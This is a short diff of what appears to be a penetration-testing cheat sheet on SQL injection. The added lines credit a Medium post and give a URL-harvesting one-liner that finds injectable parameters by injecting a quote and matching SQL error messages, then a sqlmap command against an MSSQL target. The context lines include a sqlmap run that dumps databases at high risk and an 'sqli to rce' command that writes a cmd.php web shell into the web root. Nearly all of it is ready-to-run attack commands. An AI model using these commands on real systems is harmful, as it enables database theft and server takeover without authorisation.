@@ -118,7 +118,12 @@ cat allurls.txt | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 3 --
 >>sqli to rce
 sqlmap -u "target.com" --file-write="cmd.php" --file-dest="/var/www/html/cmd.php" -batch
 
+font:https://ezzat1995.medium.com/how-to-find-sql-injection-using-a-simple-technique-bc7e8100a6f3
+>>find
+echo "http://<target>/" | gau | uro | grep "\?" | sed "s/=.*/=A\'/" | uniq > params.txt; cat params.txt | httpx -mr ".*SQL.*|.*syntax.*|.*error.*"
 
+>>test
+sqlmap -u "http://<target>/sqli?param=A" -p param --dbms=MSSQL --level 1 --risk 1 --banner
 
 -------------------------------------------------------------------
 
